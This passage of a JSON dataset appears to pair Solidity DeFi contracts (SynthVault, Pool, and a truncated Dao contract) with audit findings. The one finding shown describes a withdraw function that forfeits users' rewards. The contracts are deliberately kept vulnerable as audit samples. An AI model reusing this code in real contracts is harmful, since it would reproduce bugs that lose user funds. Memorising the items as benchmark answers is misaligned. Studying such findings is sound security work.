[
    {
        "Code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.3;\nimport \"./interfaces/iBEP20.sol\";\nimport \"./interfaces/iDAO.sol\";\nimport \"./interfaces/iBASE.sol\";\nimport \"./interfaces/iPOOL.sol\";\nimport \"./interfaces/iSYNTH.sol\";\nimport \"./interfaces/iUTILS.sol\";\nimport \"./interfaces/iRESERVE.sol\";\nimport \"./interfaces/iSYNTHFACTORY.sol\";\nimport \"./interfaces/iPOOLFACTORY.sol\";\n\ncontract SynthVault {\n    address public BASE;\n    address public DEPLOYER;\n\n    uint256 public minimumDepositTime;  // Withdrawal & Harvest lockout period; intended to be 1 hour\n    uint256 public totalWeight;         // Total weight of the whole SynthVault\n    uint256 public erasToEarn;          // Amount of eras that make up the targeted RESERVE depletion; regulates incentives\n    uint256 public vaultClaim;          // The SynthVaults's portion of rewards; intended to be ~10% initially\n    address [] public stakedSynthAssets; // Array of all synth assets that have ever been staked in (scope: vault)\n    uint private lastMonth;             // Timestamp of the start of current metric period (For UI)\n    uint public genesis;                // Timestamp from when the synth was first deployed (For UI)\n\n    uint256 public map30DVaultRevenue; // Tally of revenue during current incomplete metric period (for UI)\n    uint256 public mapPast30DVaultRevenue; // Tally of revenue from last full metric period (for UI)\n    uint256 [] public revenueArray; // Array of the last two metric periods (For UI)\n\n    // Restrict access\n    modifier onlyDAO() {\n        require(msg.sender == _DAO().DAO() || msg.sender == DEPLOYER);\n        _;\n    }\n\n    constructor(address _base) {\n        BASE = _base;\n        DEPLOYER = msg.sender;\n        erasToEarn = 30;\n        minimumDepositTime = 3600; // 1 hour\n        vaultClaim = 1000;\n        genesis = block.timestamp;\n        lastMonth = 0;\n    }\n\n    function _DAO() internal view returns(iDAO) {\n        return iBASE(BASE).DAO();\n    }\n\n    mapping(address => mapping(address => uint256)) private mapMemberSynth_weight;\n    mapping(address => uint256) private mapMemberTotal_weight;\n    mapping(address => mapping(address => uint256)) private mapMemberSynth_deposit;\n\n    mapping(address => mapping(address => uint256)) private mapMemberSynth_lastTime;\n    mapping(address => uint256) private mapMember_depositTime;\n    mapping(address => uint256) public lastBlock;\n    mapping(address => bool) private isStakedSynth;\n    mapping(address => mapping(address => bool)) private isSynthMember;\n\n    event MemberDeposits(\n        address indexed synth,\n        address indexed member,\n        uint256 newDeposit,\n        uint256 weight,\n        uint256 totalWeight\n    );\n    event MemberWithdraws(\n        address indexed synth,\n        address indexed member,\n        uint256 amount,\n        uint256 weight,\n        uint256 totalWeight\n    );\n    event MemberHarvests(\n        address indexed synth,\n        address indexed member,\n        uint256 amount,\n        uint256 weight,\n        uint256 totalWeight\n    );\n\n    function setParams(uint256 one, uint256 two, uint256 three) external onlyDAO {\n        erasToEarn = one;\n        minimumDepositTime = two;\n        vaultClaim = three;\n    }\n\n    //====================================== DEPOSIT ========================================//\n\n    // User deposits Synths in the SynthVault\n    function deposit(address synth, uint256 amount) external {\n        depositForMember(synth, msg.sender, amount);\n    }\n\n    // Contract deposits Synths in the SynthVault for user\n    function depositForMember(address synth, address member, uint256 amount) public {\n        require(iSYNTHFACTORY(_DAO().SYNTHFACTORY()).isSynth(synth), \"!synth\"); // Must be a valid synth\n        require(iBEP20(synth).transferFrom(msg.sender, address(this), amount)); // Must successfuly transfer in\n        _deposit(synth, member, amount); // Assess and record the deposit\n    }\n\n    // Check and record the deposit\n    function _deposit(address _synth, address _member, uint256 _amount) internal {\n        if(!isStakedSynth[_synth]){\n            isStakedSynth[_synth] = true; // Record as a staked synth\n            stakedSynthAssets.push(_synth); // Add to staked synth array\n        }\n        mapMemberSynth_lastTime[_member][_synth] = block.timestamp + minimumDepositTime; // Record deposit time (scope: member -> synth)\n        mapMember_depositTime[_member] = block.timestamp + minimumDepositTime; // Record deposit time (scope: member)\n        mapMemberSynth_deposit[_member][_synth] += _amount; // Record balance for member\n        uint256 _weight = iUTILS(_DAO().UTILS()).calcSpotValueInBase(iSYNTH(_synth).LayerONE(), _amount); // Get the SPARTA weight of the deposit\n        mapMemberSynth_weight[_member][_synth] += _weight; // Add the weight to the user (scope: member -> synth)\n        mapMemberTotal_weight[_member] += _weight; // Add to the user's total weight (scope: member)\n        totalWeight += _weight; // Add to the total weight (scope: vault)\n        isSynthMember[_member][_synth] = true; // Record user as a member\n        emit MemberDeposits(_synth, _member, _amount, _weight, totalWeight);\n    }\n\n    //====================================== HARVEST ========================================//\n\n    // User harvests all of their available rewards\n    function harvestAll() external returns (bool) {\n        for(uint i = 0; i < stakedSynthAssets.length; i++){\n            if((block.timestamp > mapMemberSynth_lastTime[msg.sender][stakedSynthAssets[i]])){\n                uint256 reward = calcCurrentReward(stakedSynthAssets[i], msg.sender);\n                if(reward > 0){\n                    harvestSingle(stakedSynthAssets[i]);\n                }\n            }\n            \n        }\n        return true;\n    }\n\n    // User harvests available rewards of the chosen asset\n    function harvestSingle(address synth) public returns (bool) {\n        require(iSYNTHFACTORY(_DAO().SYNTHFACTORY()).isSynth(synth), \"!synth\"); // Must be valid synth\n        require(iRESERVE(_DAO().RESERVE()).emissions(), \"!emissions\"); // RESERVE emissions must be on\n        uint256 _weight;\n        uint256 reward = calcCurrentReward(synth, msg.sender); // Calc user's current SPARTA reward\n        mapMemberSynth_lastTime[msg.sender][synth] = block.timestamp; // Set last harvest time as now\n        address _poolOUT = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(iSYNTH(synth).LayerONE()); // Get pool address\n        iRESERVE(_DAO().RESERVE()).grantFunds(reward, _poolOUT); // Send the SPARTA from RESERVE to POOL\n        (uint synthReward,) = iPOOL(_poolOUT).mintSynth(synth, address(this)); // Mint synths & tsf to SynthVault\n        _weight = iUTILS(_DAO().UTILS()).calcSpotValueInBase(iSYNTH(synth).LayerONE(), synthReward); // Calc reward's SPARTA value\n        mapMemberSynth_deposit[msg.sender][synth] += synthReward; // Record deposit for the user (scope: member -> synth)\n        mapMemberSynth_weight[msg.sender][synth] += _weight; // Add the weight to the user (scope: member -> synth)\n        mapMemberTotal_weight[msg.sender] += _weight; // Add to the user's total weight (scope: member)\n        totalWeight += _weight; // Add to the total weight (scope: vault)\n        _addVaultMetrics(reward); // Add to the revenue metrics (for UI)\n        iSYNTH(synth).realise(_poolOUT); // Check synth-held LP value for premium; burn if so\n        emit MemberHarvests(synth, msg.sender, reward, _weight, totalWeight);\n        return true;\n    }\n\n    // Calculate the user's current incentive-claim per era based on selected asset\n    function calcCurrentReward(address synth, address member) public view returns (uint256 reward){\n        require((block.timestamp > mapMemberSynth_lastTime[member][synth]), \"!unlocked\"); // Must not harvest before lockup period passed\n        uint256 _secondsSinceClaim = block.timestamp - mapMemberSynth_lastTime[member][synth]; // Get seconds passed since last claim\n        uint256 _share = calcReward(synth, member); // Get member's share of RESERVE incentives\n        reward = (_share * _secondsSinceClaim) / iBASE(BASE).secondsPerEra(); // User's share times eras since they last claimed\n        return reward;\n    }\n\n    // Calculate the user's current total claimable incentive\n    function calcReward(address synth, address member) public view returns (uint256) {\n        uint256 _weight = mapMemberSynth_weight[member][synth]; // Get user's weight (scope: member -> synth)\n        uint256 _reserve = reserveBASE() / erasToEarn; // Aim to deplete reserve over a number of days\n        uint256 _vaultReward = (_reserve * vaultClaim) / 10000; // Get the SynthVault's share of that\n        return iUTILS(_DAO().UTILS()).calcShare(_weight, totalWeight, _vaultReward); // Get member's share of that\n    }\n\n    //====================================== WITHDRAW ========================================//\n\n    // User withdraws a percentage of their synths from the vault\n    function withdraw(address synth, uint256 basisPoints) external returns (uint256 redeemedAmount) {\n        redeemedAmount = _processWithdraw(synth, msg.sender, basisPoints); // Perform the withdrawal\n        require(iBEP20(synth).transfer(msg.sender, redeemedAmount)); // Transfer from SynthVault to user\n        return redeemedAmount;\n    }\n\n    // Contract withdraws a percentage of user's synths from the vault\n    function _processWithdraw(address _synth, address _member, uint256 _basisPoints) internal returns (uint256 synthReward) {\n        require((block.timestamp > mapMember_depositTime[_member]), \"lockout\"); // Must not withdraw before lockup period passed\n        uint256 _principle = iUTILS(_DAO().UTILS()).calcPart(_basisPoints, mapMemberSynth_deposit[_member][_synth]); // Calc amount to withdraw\n        mapMemberSynth_deposit[_member][_synth] -= _principle; // Remove from user's recorded vault holdings\n        uint256 _weight = iUTILS(_DAO().UTILS()).calcPart(_basisPoints, mapMemberSynth_weight[_member][_synth]); // Calc SPARTA value of amount\n        mapMemberTotal_weight[_member] -= _weight; // Remove from member's total weight (scope: member)\n        mapMemberSynth_weight[_member][_synth] -= _weight; // Remove from member's synth weight (scope: member -> synth)\n        totalWeight -= _weight; // Remove from total weight (scope: vault)\n        emit MemberWithdraws(_synth, _member, synthReward, _weight, totalWeight);\n        return (_principle + synthReward);\n    }\n\n    //================================ Helper Functions ===============================//\n\n    function reserveBASE() public view returns (uint256) {\n        return iBEP20(BASE).balanceOf(_DAO().RESERVE());\n    }\n\n    function getMemberDeposit(address synth, address member) external view returns (uint256){\n        return mapMemberSynth_deposit[member][synth];\n    }\n\n    function getMemberWeight(address member) external view returns (uint256) {\n        return mapMemberTotal_weight[member];\n    }\n\n    function getStakeSynthLength() external view returns (uint256) {\n        return stakedSynthAssets.length;\n    }\n\n    function getMemberLastTime(address member) external view returns (uint256) {\n        return mapMember_depositTime[member];\n    }\n\n    function getMemberLastSynthTime(address synth, address member) external view returns (uint256){\n        return mapMemberSynth_lastTime[member][synth];\n    }\n\n    function getMemberSynthWeight(address synth, address member) external view returns (uint256) {\n        return mapMemberSynth_weight[member][synth];\n    }\n\n    //=============================== SynthVault Metrics =================================//\n\n    function _addVaultMetrics(uint256 _fee) internal {\n        if(lastMonth == 0){\n            lastMonth = block.timestamp;\n        }\n        if(block.timestamp <= lastMonth + 2592000){ // 30 days\n            map30DVaultRevenue = map30DVaultRevenue + _fee;\n        } else {\n            lastMonth = block.timestamp;\n            mapPast30DVaultRevenue = map30DVaultRevenue;\n            addRevenue(mapPast30DVaultRevenue);\n            map30DVaultRevenue = 0;\n            map30DVaultRevenue = map30DVaultRevenue + _fee;\n        }\n    }\n\n    function addRevenue(uint _totalRev) internal {\n        if(!(revenueArray.length == 2)){\n            revenueArray.push(_totalRev);\n        } else {\n            addFee(_totalRev);\n        }\n    }\n\n    function addFee(uint _rev) internal {\n        uint _n = revenueArray.length; // 2\n        for (uint i = _n - 1; i > 0; i--) {\n            revenueArray[i] = revenueArray[i - 1];\n        }\n        revenueArray[0] = _rev;\n    }\n}\n\n\n",
        "CodeNames": [
            "synthVault.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-01",
                "Location": [
                    "SynthVault",
                    "synthReward",
                    "_processWithdraw"
                ],
                "Type": "  SynthVault  withdraw forfeits rewards",
                "Description": "\n\nThe SynthVault.withdraw function does not claim the user's rewards. It decreases the user's weight and therefore they are forfeiting their accumulated rewards.\nThe synthReward variable in _processWithdraw is also never used it was probably intended that this variable captures the claimed rewards.\n\nUsually, withdrawal functions claim rewards first but this one does not. A user that withdraws loses all their accumulated rewards.\n\n",
                "Repair": "Recommend claiming the rewards with the user's deposited balance first in withdraw.\n\nverifyfirst (Spartan) confirmed but disagreed with severity(https://github.com/code-423n4/2021-07-spartan-findings/issues/168#issuecomment-884642575):\n  We understand there is a risk of losing unclaimed rewards if a user directly interacts with the synth-vault and not the DAPP.\n This is a design choice to protect the withdrawal function.\n We affirm the synthReward variable to be culled.\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.3;\nimport \"./interfaces/iBEP20.sol\";\nimport \"./interfaces/iUTILS.sol\";\nimport \"./interfaces/iDAO.sol\";\nimport \"./interfaces/iBASE.sol\";\nimport \"./interfaces/iDAOVAULT.sol\";\nimport \"./interfaces/iROUTER.sol\";\nimport \"./interfaces/iSYNTH.sol\"; \nimport \"./interfaces/iSYNTHFACTORY.sol\"; \nimport \"./interfaces/iBEP677.sol\"; \n\ncontract Pool is iBEP20 {  \n    address public BASE;\n    address public TOKEN;\n    address public DEPLOYER;\n\n    string _name; string _symbol;\n    uint8 public override decimals; uint256 public override totalSupply;\n    mapping(address => uint) private _balances;\n    mapping(address => mapping(address => uint)) private _allowances;\n\n    uint256 public baseAmount; // SPARTA amount that should be in the pool\n    uint256 public tokenAmount; // TOKEN amount that should be in the pool\n\n    uint private lastMonth; // Timestamp of the start of current metric period (For UI)\n    uint public genesis; // Timestamp from when the pool was first deployed (For UI)\n\n    uint256 public map30DPoolRevenue; // Tally of revenue during current incomplete metric period (for UI)\n    uint256 public mapPast30DPoolRevenue; // Tally of revenue from last full metric period (for UI)\n    uint256 [] public revenueArray; // Array of the last two metric periods (For UI)\n\n    event AddLiquidity(address indexed member, uint inputBase, uint inputToken, uint unitsIssued);\n    event RemoveLiquidity(address indexed member, uint outputBase, uint outputToken, uint unitsClaimed);\n    event Swapped(address indexed tokenFrom, address indexed tokenTo, address indexed recipient, uint inputAmount, uint outputAmount, uint fee);\n    event MintSynth(address indexed member, address indexed base, uint256 baseAmount, address indexed token, uint256 synthAmount);\n    event BurnSynth(address indexed member, address indexed base, uint256 baseAmount, address indexed token, uint256 synthAmount);\n\n    function _DAO() internal view returns(iDAO) {\n        return iBASE(BASE).DAO();\n    }\n\n    constructor (address _base, address _token) {\n        BASE = _base;\n        TOKEN = _token;\n        string memory poolName = \"-SpartanProtocolPool\";\n        string memory poolSymbol = \"-SPP\";\n        _name = string(abi.encodePacked(iBEP20(_token).name(), poolName));\n        _symbol = string(abi.encodePacked(iBEP20(_token).symbol(), poolSymbol));\n        decimals = 18;\n        genesis = block.timestamp;\n        DEPLOYER = msg.sender;\n        lastMonth = 0;\n    }\n\n    //========================================iBEP20=========================================//\n\n    function name() external view override returns (string memory) {\n        return _name;\n    }\n\n    function symbol() external view override returns (string memory) {\n        return _symbol;\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function transfer(address recipient, uint256 amount) external virtual override returns (bool) {\n        _transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function approve(address spender, uint256 amount) external virtual override returns (bool) {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool) {\n        _approve(msg.sender, spender, _allowances[msg.sender][spender]+(addedValue));\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {\n        uint256 currentAllowance = _allowances[msg.sender][spender];\n        require(currentAllowance >= subtractedValue, \"!approval\");\n        _approve(msg.sender, spender, currentAllowance - subtractedValue);\n        return true;\n    }\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"!owner\");\n        require(spender != address(0), \"!spender\");\n        if (_allowances[owner][spender] < type(uint256).max) { // No need to re-approve if already max\n            _allowances[owner][spender] = amount;\n            emit Approval(owner, spender, amount);\n        }\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) external virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n        // Max approval (saves an SSTORE)\n        if (_allowances[sender][msg.sender] < type(uint256).max) {\n            uint256 currentAllowance = _allowances[sender][msg.sender];\n            require(currentAllowance >= amount, \"!approval\");\n            _approve(sender, msg.sender, currentAllowance - amount);\n        }\n        return true;\n    }\n\n    //iBEP677 approveAndCall\n    function approveAndCall(address recipient, uint amount, bytes calldata data) external returns (bool) {\n      _approve(msg.sender, recipient, type(uint256).max); // Give recipient max approval\n      iBEP677(recipient).onTokenApproval(address(this), amount, msg.sender, data); // Amount is passed thru to recipient\n      return true;\n    }\n\n    //iBEP677 transferAndCall\n    function transferAndCall(address recipient, uint amount, bytes calldata data) external returns (bool) {\n      _transfer(msg.sender, recipient, amount);\n      iBEP677(recipient).onTokenTransfer(address(this), amount, msg.sender, data); // Amount is passed thru to recipient \n      return true;\n    }\n\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n        require(sender != address(0), \"!sender\");\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance >= amount, \"!balance\");\n        _balances[sender] -= amount;\n        _balances[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n    }\n\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"!account\");\n        totalSupply += amount;\n        _balances[account] += amount;\n        emit Transfer(address(0), account, amount);\n    }\n\n    function burn(uint256 amount) external virtual override {\n        _burn(msg.sender, amount);\n    }\n\n    function burnFrom(address account, uint256 amount) external virtual {  \n        uint256 decreasedAllowance = allowance(account, msg.sender) - (amount);\n        _approve(account, msg.sender, decreasedAllowance); \n        _burn(account, amount);\n    }\n\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"!account\");\n        require(_balances[account] >= amount, \"!balance\");\n        _balances[account] -= amount;\n        totalSupply -= amount;\n        emit Transfer(account, address(0), amount);\n    }\n\n    //====================================POOL FUNCTIONS =================================//\n\n    // User adds liquidity to the pool\n    function add() external returns(uint liquidityUnits){\n        liquidityUnits = addForMember(msg.sender);\n        return liquidityUnits;\n    }\n\n    // Contract adds liquidity for user \n    function addForMember(address member) public returns(uint liquidityUnits){\n        uint256 _actualInputBase = _getAddedBaseAmount(); // Get the received SPARTA amount\n        uint256 _actualInputToken = _getAddedTokenAmount(); // Get the received TOKEN amount\n        if(baseAmount == 0 || tokenAmount == 0){\n        require(_actualInputBase != 0 && _actualInputToken != 0, \"!Balanced\");\n        }\n        liquidityUnits = iUTILS(_DAO().UTILS()).calcLiquidityUnits(_actualInputBase, baseAmount, _actualInputToken, tokenAmount, totalSupply); // Calculate LP tokens to mint\n        _incrementPoolBalances(_actualInputBase, _actualInputToken); // Update recorded BASE and TOKEN amounts\n        _mint(member, liquidityUnits); // Mint the LP tokens directly to the user\n        emit AddLiquidity(member, _actualInputBase, _actualInputToken, liquidityUnits);\n        return liquidityUnits;\n    }\n    \n    // User removes liquidity from the pool \n    function remove() external returns (uint outputBase, uint outputToken) {\n        return removeForMember(msg.sender);\n    } \n\n    // Contract removes liquidity for the user\n    function removeForMember(address member) public returns (uint outputBase, uint outputToken) {\n        uint256 _actualInputUnits = balanceOf(address(this)); // Get the received LP units amount\n        outputBase = iUTILS(_DAO().UTILS()).calcLiquidityHoldings(_actualInputUnits, BASE, address(this)); // Get the SPARTA value of LP units\n        outputToken = iUTILS(_DAO().UTILS()).calcLiquidityHoldings(_actualInputUnits, TOKEN, address(this)); // Get the TOKEN value of LP units\n        _decrementPoolBalances(outputBase, outputToken); // Update recorded BASE and TOKEN amounts\n        _burn(address(this), _actualInputUnits); // Burn the LP tokens\n        iBEP20(BASE).transfer(member, outputBase); // Transfer the SPARTA to user\n        iBEP20(TOKEN).transfer(member, outputToken); // Transfer the TOKENs to user\n        emit RemoveLiquidity(member, outputBase, outputToken, _actualInputUnits);\n        return (outputBase, outputToken);\n    }\n\n    // Caller swaps tokens\n    function swap(address token) external returns (uint outputAmount, uint fee){\n        (outputAmount, fee) = swapTo(token, msg.sender);\n        return (outputAmount, fee);\n    }\n\n    // Contract swaps tokens for the member\n    function swapTo(address token, address member) public payable returns (uint outputAmount, uint fee) {\n        require((token == BASE || token == TOKEN), \"!BASE||TOKEN\"); // Must be SPARTA or the pool's relevant TOKEN\n        address _fromToken; uint _amount;\n        if(token == BASE){\n            _fromToken = TOKEN; // If SPARTA is selected; swap from TOKEN\n            _amount = _getAddedTokenAmount(); // Get the received TOKEN amount\n            (outputAmount, fee) = _swapTokenToBase(_amount); // Calculate the SPARTA output from the swap\n        } else {\n            _fromToken = BASE; // If TOKEN is selected; swap from SPARTA\n            _amount = _getAddedBaseAmount(); // Get the received SPARTA amount\n            (outputAmount, fee) = _swapBaseToToken(_amount); // Calculate the TOKEN output from the swap\n        }\n        emit Swapped(_fromToken, token, member, _amount, outputAmount, fee);\n        iBEP20(token).transfer(member, outputAmount); // Transfer the swap output to the selected user\n        return (outputAmount, fee);\n    }\n\n    // Swap SPARTA for Synths\n    function mintSynth(address synthOut, address member) external returns(uint outputAmount, uint fee) {\n        require(iSYNTHFACTORY(_DAO().SYNTHFACTORY()).isSynth(synthOut) == true, \"!synth\"); // Must be a valid Synth\n        uint256 _actualInputBase = _getAddedBaseAmount(); // Get received SPARTA amount\n        uint output = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputBase, baseAmount, tokenAmount); // Calculate value of swapping SPARTA to the relevant underlying TOKEN\n        uint _liquidityUnits = iUTILS(_DAO().UTILS()).calcLiquidityUnitsAsym(_actualInputBase, address(this)); // Calculate LP tokens to be minted\n        _incrementPoolBalances(_actualInputBase, 0); // Update recorded SPARTA amount\n        uint _fee = iUTILS(_DAO().UTILS()).calcSwapFee(_actualInputBase, baseAmount, tokenAmount); // Calc slip fee in TOKEN\n        fee = iUTILS(_DAO().UTILS()).calcSpotValueInBase(TOKEN, _fee); // Convert TOKEN fee to SPARTA\n        _mint(synthOut, _liquidityUnits); // Mint the LP tokens directly to the Synth contract to hold\n        iSYNTH(synthOut).mintSynth(member, output); // Mint the Synth tokens directly to the user\n        _addPoolMetrics(fee); // Add slip fee to the revenue metrics\n        emit MintSynth(member, BASE, _actualInputBase, TOKEN, outputAmount);\n      return (output, fee);\n    }\n    \n    // Swap Synths for SPARTA\n    function burnSynth(address synthIN, address member) external returns(uint outputAmount, uint fee) {\n        require(iSYNTHFACTORY(_DAO().SYNTHFACTORY()).isSynth(synthIN) == true, \"!synth\"); // Must be a valid Synth\n        uint _actualInputSynth = iBEP20(synthIN).balanceOf(address(this)); // Get received SYNTH amount\n        uint outputBase = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputSynth, tokenAmount, baseAmount); // Calculate value of swapping relevant underlying TOKEN to SPARTA\n        fee = iUTILS(_DAO().UTILS()).calcSwapFee(_actualInputSynth, tokenAmount, baseAmount); // Calc slip fee in SPARTA\n        iBEP20(synthIN).transfer(synthIN, _actualInputSynth); // Transfer SYNTH to relevant synth contract\n        iSYNTH(synthIN).burnSynth(); // Burn the SYNTH units\n        _decrementPoolBalances(outputBase, 0); // Update recorded SPARTA amount\n        iBEP20(BASE).transfer(member, outputBase); // Transfer SPARTA to user\n        _addPoolMetrics(fee); // Add slip fee to the revenue metrics\n        emit BurnSynth(member, BASE, outputBase, TOKEN, _actualInputSynth);\n      return (outputBase, fee);\n    }\n\n    //=======================================INTERNAL MATHS======================================//\n\n    // Check the SPARTA amount received by this Pool\n    function _getAddedBaseAmount() internal view returns(uint256 _actual){\n        uint _baseBalance = iBEP20(BASE).balanceOf(address(this)); \n        if(_baseBalance > baseAmount){\n            _actual = _baseBalance-(baseAmount);\n        } else {\n            _actual = 0;\n        }\n        return _actual;\n    }\n  \n    // Check the TOKEN amount received by this Pool\n    function _getAddedTokenAmount() internal view returns(uint256 _actual){\n        uint _tokenBalance = iBEP20(TOKEN).balanceOf(address(this)); \n        if(_tokenBalance > tokenAmount){\n            _actual = _tokenBalance-(tokenAmount);\n        } else {\n            _actual = 0;\n        }\n        return _actual;\n    }\n\n    // Calculate output of swapping SPARTA for TOKEN & update recorded amounts\n    function _swapBaseToToken(uint256 _x) internal returns (uint256 _y, uint256 _fee){\n        uint256 _X = baseAmount;\n        uint256 _Y = tokenAmount;\n        _y =  iUTILS(_DAO().UTILS()).calcSwapOutput(_x, _X, _Y); // Calc TOKEN output\n        uint fee = iUTILS(_DAO().UTILS()).calcSwapFee(_x, _X, _Y); // Calc TOKEN fee\n        _fee = iUTILS(_DAO().UTILS()).calcSpotValueInBase(TOKEN, fee); // Convert TOKEN fee to SPARTA\n        _setPoolAmounts(_X + _x, _Y - _y); // Update recorded BASE and TOKEN amounts\n        _addPoolMetrics(_fee); // Add slip fee to the revenue metrics\n        return (_y, _fee);\n    }\n\n    // Calculate output of swapping TOKEN for SPARTA & update recorded amounts\n    function _swapTokenToBase(uint256 _x) internal returns (uint256 _y, uint256 _fee){\n        uint256 _X = tokenAmount;\n        uint256 _Y = baseAmount;\n        _y =  iUTILS(_DAO().UTILS()).calcSwapOutput(_x, _X, _Y); // Calc SPARTA output\n        _fee = iUTILS(_DAO().UTILS()).calcSwapFee(_x, _X, _Y); // Calc SPARTA fee\n        _setPoolAmounts(_Y - _y, _X + _x); // Update recorded BASE and TOKEN amounts\n        _addPoolMetrics(_fee); // Add slip fee to the revenue metrics\n        return (_y, _fee);\n    }\n\n    //=======================================BALANCES=========================================//\n\n    // Sync internal balances to actual\n    function sync() external {\n        baseAmount = iBEP20(BASE).balanceOf(address(this));\n        tokenAmount = iBEP20(TOKEN).balanceOf(address(this));\n    }\n\n    // Increment internal balances\n    function _incrementPoolBalances(uint _baseAmount, uint _tokenAmount) internal  {\n        baseAmount += _baseAmount;\n        tokenAmount += _tokenAmount;\n    }\n\n    // Set internal balances\n    function _setPoolAmounts(uint256 _baseAmount, uint256 _tokenAmount) internal  {\n        baseAmount = _baseAmount;\n        tokenAmount = _tokenAmount; \n    }\n\n    // Decrement internal balances\n    function _decrementPoolBalances(uint _baseAmount, uint _tokenAmount) internal  {\n        baseAmount -= _baseAmount;\n        tokenAmount -= _tokenAmount; \n    }\n\n    //===========================================POOL FEE ROI=================================//\n\n    function _addPoolMetrics(uint256 _fee) internal {\n        if(lastMonth == 0){\n            lastMonth = block.timestamp;\n        }\n        if(block.timestamp <= lastMonth + 2592000){ // 30Days\n            map30DPoolRevenue = map30DPoolRevenue+(_fee);\n        } else {\n            lastMonth = block.timestamp;\n            mapPast30DPoolRevenue = map30DPoolRevenue;\n            addRevenue(mapPast30DPoolRevenue);\n            map30DPoolRevenue = 0;\n            map30DPoolRevenue = map30DPoolRevenue+(_fee);\n        }\n    }\n\n    function addRevenue(uint _totalRev) internal {\n        if(!(revenueArray.length == 2)){\n            revenueArray.push(_totalRev);\n        } else {\n            addFee(_totalRev);\n        }\n    }\n\n    function addFee(uint _rev) internal {\n        uint _n = revenueArray.length; // 2\n        for (uint i = _n - 1; i > 0; i--) {\n            revenueArray[i] = revenueArray[i - 1];\n        }\n        revenueArray[0] = _rev;\n    }\n}\n\n\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.3;\nimport \"./interfaces/iUTILS.sol\";\nimport \"./interfaces/iRESERVE.sol\";\nimport \"./interfaces/iDAOVAULT.sol\";\nimport \"./interfaces/iROUTER.sol\";\nimport \"./interfaces/iBONDVAULT.sol\";\nimport \"./interfaces/iBASE.sol\"; \nimport \"./interfaces/iBEP20.sol\";\nimport \"./interfaces/iPOOLFACTORY.sol\";\nimport \"./interfaces/iSYNTHFACTORY.sol\";\nimport \"./interfaces/iSYNTHVAULT.sol\";\n\ncontract Dao {\n    address public DEPLOYER;\n    address public BASE;\n\n    uint256 public secondsPerEra;   // Amount of seconds per era (Inherited from BASE contract; intended to be ~1 day)\n    uint256 public coolOffPeriod;   // Amount of time a proposal will need to be in finalising stage before it can be finalised\n    uint256 public proposalCount;   // Count of proposals\n    uint256 public majorityFactor;  // Number used to calculate majority; intended to be 6666bp === 2/3\n    uint256 public erasToEarn;      // Amount of eras that make up the targeted RESERVE depletion; regulates incentives\n    uint256 public daoClaim;        // The DAOVault's portion of rewards; intended to be ~10% initially\n    uint256 public daoFee;          // The SPARTA fee for a user to create a new proposal, intended to be 100 SPARTA initially\n    uint256 public currentProposal; // The most recent proposal; should be === proposalCount\n    \n    struct MemberDetails {\n        bool isMember;\n        uint weight;\n        uint lastBlock;\n        uint poolCount;\n    }\n    struct ProposalDetails {\n        uint id;\n        string proposalType;\n        uint votes;\n        uint coolOffTime;\n        bool finalising;\n        bool finalised;\n        uint param;\n        address proposedAddress;\n        bool open;\n        uint startTime;\n    }\n\n    bool public daoHasMoved;\n    address public DAO;\n\n    iROUTER private _ROUTER;\n    iUTILS private _UTILS;\n    iBONDVAULT private _BONDVAULT;\n    iDAOVAULT private _DAOVAULT;\n    iPOOLFACTORY private _POOLFACTORY;\n    iSYNTHFACTORY private _SYNTHFACTORY;\n    iRESERVE private _RESERVE;\n    iSYNTHVAULT private _SYNTHVAULT;\n\n    address[] public arrayMembers;\n    address [] listedBondAssets; // Only used in UI; is intended to be a historical array of all past Bond listed assets\n    uint256 public bondingPeriodSeconds = 15552000; // Vesting period for bonders (6 months)\n    \n    mapping(address => bool) public isMember;\n    mapping(address => bool) public isListed; // Used internally to get CURRENT listed Bond assets\n    mapping(address => uint256) public mapMember_lastTime;\n\n    mapping(uint256 => uint256) public mapPID_param;\n    mapping(uint256 => address) public mapPID_address;\n    mapping(uint256 => string) public mapPID_type;\n    mapping(uint256 => uint256) public mapPID_votes;\n    mapping(uint256 => uint256) public mapPID_coolOffTime;\n    mapping(uint256 => bool) public mapPID_finalising;\n    mapping(uint256 => bool) public mapPID_finalised;\n    mapping(uint256 => bool) public mapPID_open;\n    mapping(uint256 => uint256) public mapPID_startTime;\n    mapping(uint256 => mapping(address => uint256)) public mapPIDMember_votes;\n\n    event MemberDeposits(address indexed member, address indexed pool, uint256 amount);\n    event MemberWithdraws(address indexed member, address indexed pool, uint256 balance);\n\n    event NewProposal(address indexed member, uint indexed proposalID, string proposalType);\n    event NewVote(address indexed member, uint indexed proposalID, uint voteWeight, uint totalVotes, string proposalType);\n    event RemovedVote(address indexed member, uint indexed proposalID, uint voteWeight, uint totalVotes, string proposalType);\n    event ProposalFinalising(address indexed member, uint indexed proposalID, uint timeFinalised, string proposalType);\n    event CancelProposal(address indexed member, uint indexed proposalID);\n    event FinalisedProposal(address indexed member, uint indexed proposalID, uint votesCast, uint totalWeight, string proposalType);\n    event ListedAsset(address indexed DAO, address indexed asset);\n    event DelistedAsset(address indexed DAO, address indexed asset);\n    event DepositAsset(address indexed owner, uint256 depositAmount, uint256 bondedLP);\n\n    // Restrict 